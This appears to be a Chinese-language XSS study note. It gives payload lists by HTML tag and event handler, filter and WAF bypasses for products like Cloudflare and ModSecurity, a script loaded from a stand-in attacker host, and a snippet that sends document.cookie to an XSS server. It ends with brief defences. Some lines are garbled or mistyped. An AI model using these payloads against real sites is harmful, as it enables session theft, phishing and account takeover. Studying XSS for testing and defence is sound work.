---
date: 2025-01-15
---

XSS：跨站脚本注入。攻击者在web页面插入脚本，访问页面时，脚本被触发。是针对用户的攻击。

分类：反射型，储存型，dom型。
**反射型**：攻击者构造url，点击url的时候，会执行脚本，产生危害

<img src="https://img-blog.csdnimg.cn/img_convert/4f28e4b1c87bbaaba61869c48c6c7ee4.png" alt="img" style="zoom:50%;" />



**存储型**将脚本存储到服务器中，用户访问被插入脚本的页面，会执行脚本

<img src="https://img-blog.csdnimg.cn/img_convert/0f24b77c3f8a3f5bf90c81b56d5eb3ba.png" alt="img" style="zoom:50%;" />

**dom型**：dom(文档对象模型),将html和xml文档解析为有很多节点的树状结构。
允许通过script访问/修改节点，达到动态网页。





# payload

(可利用的标签)
## 标签
### svg

> (可缩放矢量图形)标签 用来直接嵌入SVG文件

```html
<svg onload="alert()">   //onload  加载完成执行
```

### img

```html
<img scr="" onerror=alert(1)>
```

### body

```html
<body onload="alert">
<body onpageshow=alert>
<body onscroll=alert()><br><br><br><br><br><br></body> //onscroll:滚动发生
```

### video

```html
<video onloadstart="alert()" src="">
```

### style

```html
<style onload=alert()>
```

### script

（javascript，TypeScript,CoffeeScript...）

```html
<script>alert();</script>
```

### input

```html
<input onfocus=alert()>   // onfocus：事件在对象获得焦点时发生
<input onblur=alert() autorfocus> autorfocus：自动获得焦点 	onblur：失焦时
```

### details  

> 可展开折叠的区域

```html
<details ontoggle=alert()></details>   ontoggle：展开|折叠
<details open=alert()></details>    open:默认打开，自动触发
```

### select ：

创建下拉表

```html
<select> onfocus=alert(1)</select>
<select onfocus=alert(1) autofocus></select>
```

### iframe

```html
<iframe onload = alert()>
```

### audio

```html
<audio onerror=alert(1) src="error_src"></audio>
```

### textarea

```html
<textarea onfocus=alert()></textarea>
```

### keygen   仅限火狐

```html
<keygen onfocus=alert() autofocus>
```

### marquee   谷歌不行

```html
<marquee onsart=alert()>
```

### isindex 仅限IE

```html
<isindex type=image src=  onerror=alert()></isindex>
```
##  事件
onload
onbeforeunload
onunload
onpageshow
onpagehide

onclick
ondblclick
onmousedown
onmouseup
onmousemove
onmouseover
onmouseout
onmouseenter
onmouseleave
oncontextmenu

onkeydown
onkeyup
onkeypress   （已废弃，不建议使用）

onfocus
onblur
onchange
oninput
onsubmit
onreset
oninvalid
onselect

oncopy
oncut
onpaste

ondrag
ondragstart
ondragend
ondragenter
ondragleave
ondragover
ondrop

ontouchstart
ontouchmove
ontouchend
ontouchcancel

onpointerdown
onpointerup
onpointermove
onpointerenter
onpointerleave
onpointercancel

onplay
onpause
onended
onvolumechange
ontimeupdate
onloadeddata
oncanplay

onload
onerror

onanimationstart
onanimationend
onanimationiteration

ontransitionstart
ontransitionend
ontransitionrun

# 绕过

### 三重url编码

> 当",<> 被转义，"转为$quot，可以尝试url编码，二重url编码，如果二重和一重一样，那么服务器进行了解码。那么就可以尝试三重编码

### **空格过滤**

/可以代替空格         `<img/src=""onerror=alert()>`

### **引号过滤**

在htm标签l中，可以不用引号，在js中可以用反引号

### **括号过滤**
反引号
```
<img/src=""onerror=alert`1`>
```
用throw               

```html
<img src=x onerror="javascript:window.onerror=alert;throw 1">
```

### **关键字过滤**
#### 使用 %
限制IIS
#### 大小写绕过         
`<sCRiPt>alert(1);</sCrIpT>`

### **双写绕过**，只过滤一次

双写          `<scscriptript> alert() <scripscirptt>`

### **字符串拼接绕过**  

js也有eval,将payload分解再拼接，eval让其执行

```html
<img src="s" onerror="a='alert';b='(1)';eval(a+b)">
```

### **编码绕过**

Unicode编码绕过

```html
<img src="x" onerror="eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b')">

```

url编码绕过

```html
<img src="x" onerror="eval(unescape('%61%6c%65%72%74%28%22%78%73%73%22%29%3b'))">
```

hsx绕过

```html
<img src=x onerror=eval('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')>
```

base64绕过

```html
<img src="x" onerror="eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw=='))">

<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
```

Ascii

```html
<img src="x" onerror="eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))">
```

* js伪协议

  ```html
  <a href=javascript:alert()></a>
  ```

## 绕过CSP
conten security policy。内容安全策略。
通过指令限制只能从指定域中加载资源：
```
script-src <https://scripts.normal-website.com>
```


## 标签语法替换

```js
<scr<script>ipt>alert("XSS")</scr<script>ipt>
1
<script>alert("XSS")</script>
<script src="http://attacker.org/malicious.js"></script>
12
```

2.特殊符号干扰

3.提交方式更改

4.垃圾数据溢出

5.加密解密算法

6.结合其他漏洞绕过

下面的列表包含了可绕过的WAF、Paylaod以及相关的绕过技术

```html
WAF名称：Cloudflare
Payload：<a”/onclick=(confirm)()>click
绕过技术：非空格填充
123
WAF名称：Wordfence
Payload：<a/href=javascript&colon;alert()>click
绕过技术：数字字符编码
123
WAF名称：Barracuda
Payload：<a/href=Java%0a%0d%09script&colon;alert()>click
绕过技术：数字字符编码
123
WAF名称：Comodo
Payload：<d3v/onauxclick=(((confirm)))“>click
绕过技术：黑名单中缺少事件处理器以及函数调用混淆
123
WAF名称：F5
Payload：<d3v/onmouseleave=[2].some(confirm)>click
绕过技术：黑名单中缺少事件处理器以及函数调用混淆
123
WAF名称：ModSecurity
Payload：<details/open/ontoggle=alert()>
绕过技术：黑名单中缺少标签或事件处理器
123
WAF名称：dotdefender
Payload：<details/open/ontoggle=(confirm)()//
绕过技术：黑名单中缺少结束标签、事件处理器和函数调用混淆
```

## **过滤url地址**

url编码绕过

```html
<img src="x" onerror=document.location=`http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/`>
```

使用ip地址

```html
1.十进制IP
<img src="x" onerror=document.location=`http://2130706433/`>
数字 2130706433 转换成十六进制为 0x7F000001。
拆分为：
7F（十六进制）= 127（十进制）
00（十六进制）= 0（十进制）
00（十六进制）= 0（十进制）
01（十六进制）= 1（十进制）
2.八进制IP
<img src="x" onerror=document.location=`http://0177.0.0.01/`>

3.hex
<img src="x" onerror=document.location=`http://0x7f.0x0.0x0.0x1/`>
4.html标签中用//可以代替http://
<img src="x" onerror=document.location=`//www.baidu.com`>

5.使用\\
但是要注意在windows下\本身就有特殊用途，是一个path 的写法，所以\\在Windows下是file协议，在linux下才会是当前域的协议

6.使用中文逗号代替英文逗号
如果你在你在域名中输入中文句号浏览器会自动转化成英文的逗号
<img src="x" onerror="document.location=`http://www。baidu。com`">//会自动跳转到百度
```



# 漏洞利用

>1.挂马
>2.盗取用户Cookie。
>3.DOS（拒绝服务）客户端浏览器。
>4.钓鱼攻击，高级的钓鱼技巧。
>5.删除目标文章、恶意篡改数据、嫁祸。
>6.劫持用户Web行为，甚至进一步渗透内网。
>7.爆发Web2.0蠕虫。
>8.蠕虫式的DDoS攻击。
>9.蠕虫式挂马攻击、刷广告、刷浏量、破坏网上数据
>10.其它安全问题

### 盗取cookie

浏览器的js脚本是通过document.cookie来获取

用xss查看自己cookie：

```javascript
<script>alert(document.cookie);</script>
```

```js
<script>
	document.location="xss_server?cookie="+document.cookie#    
</script>
将url重定向到xss平台，接收cookie。
```


## 钓鱼获取账号
伪造用户登录界面，诱导用户输入账号登录。比如会话过期，等
## 获取键盘
js可以获取用户在当前页面的键盘操作
可以覆盖原生函数。
```

```
## 劫持浏览器
## 
# 防御
1. 对前端输⼊做过滤和编码
2. 给关键 cookie 使⽤ http-only
3. 限制CORS跨源